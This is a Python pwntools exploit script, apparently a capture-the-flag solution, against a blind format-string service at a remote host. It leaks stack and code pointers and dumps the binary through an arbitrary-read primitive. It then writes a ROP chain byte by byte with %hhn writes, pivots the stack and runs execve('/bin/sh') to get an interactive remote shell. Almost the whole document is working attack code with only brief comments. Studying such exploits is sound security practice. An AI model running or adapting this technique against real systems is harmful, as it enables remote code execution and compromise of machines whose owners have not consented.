###Blind pwn (recon operations must be split into several connections due to program limit)

from pwn import *

###Exploit
r = remote('nc.eonew.cn',10012)

###notice format string bug and dump stack, learn that stack input starts at 8th arg and 35th arg possibly holds pointer into code
r.send('%p.'*50+'\n\x00')
print(r.recvline())

context.arch = 'amd64'

###check pointer to realize it is pointer into libc_csu_init
def leak(addr):
    r.send(b'%9$s\n'.ljust(8,b'\x00')+p64(addr))
    return r.recvline()[:-1]

r.send('%35$p\n\x00')
ptr_into_code = int(r.recvline()[2:-1],16)
print(disasm(leak(ptr_into_code)))

###dump main function to analyze(split into chunks in case of timeout)
program = b''
for i in range(0x180):
    res = leak(ptr_into_code-i)
    if res==b'':
        program = b'\x00'+program
    else:
        program = p8(res[0])+program
print(disasm(program))

###Examine read_plt/read_got, and find syscall within read
print(disasm(leak(ptr_into_code-0x17f-0x12e)+b'\x00'))
read_got = ptr_into_code-0x17f-0x12e+0x2008e8
read_addr = u64(leak(read_got)+b'\x00\x00')
print(hex(read_addr))

read = b''
for i in range(0x20):
    res = leak(read_addr+i)
    if res==b'':
        read = read+b'\x00'
    else:
        read = read+p8(res[0])
print(disasm(read))
syscall_addr = read_addr+0x15

###Revisit first %p sequence, and notice 45th arg point into stack, try to leak main_rbp with this
r.send('%45$p\n\x00')
S = int(r.recvline()[2:-1],16)
offset = 0
for i in range(0x100):
    res = leak(S+offset)
    if res==b'%9$s':
        break
    offset-=8
r.recvline()
main_rbp = S+offset+0x110

###Write ROPchain
pop_rdi = ptr_into_code+0x16
leave = ptr_into_code-0x17f+0x12c
nop = ptr_into_code+0x17
set_param = ptr_into_code+0xd
call_func_with_set = ptr_into_code-0xd
call_func_without_set = ptr_into_code-0x4

def write(address,payload):
    for i in payload:
        if i==0:
            r.send(b'%9$hhn\n'.ljust(8,b'\x00')+p64(address))
        else:
            r.send(f'%{i}c%10$hhn\n'.encode().ljust(0x10,b'\x00')+p64(address))
        r.recvline()
        address+=1

fake_rbp = p64(main_rbp-0xf8)
stub = p64(leave)
write(main_rbp,fake_rbp+stub)

function_slots = p64(nop)+p64(syscall_addr)
params = b'/bin/sh\x00'
ROPchain = p64(set_param)+p64(0)+p64(1)+p64(read_got)+p64(0)+p64(main_rbp)+p64(0x3b)+\
           p64(call_func_with_set)+p64(0)+p64(0)+p64(1)+p64(main_rbp-0x108)+p64(0)+p64(0)+p64(0)+\
           p64(call_func_with_set)+p64(0)+p64(0)+p64(1)+p64(main_rbp-0x100)+p64(0)+p64(0)+p64(0)+\
           p64(pop_rdi)+p64(main_rbp-0xf8)+\
           p64(call_func_without_set)+\
           p64(ptr_into_code-0x17f+0xc)
payload = (b'exit\x00\x00\x00\x00'+function_slots+params+ROPchain).ljust(0xff,b'\x00')
r.send(payload)
r.send('a'*0x3b)

r.interactive()
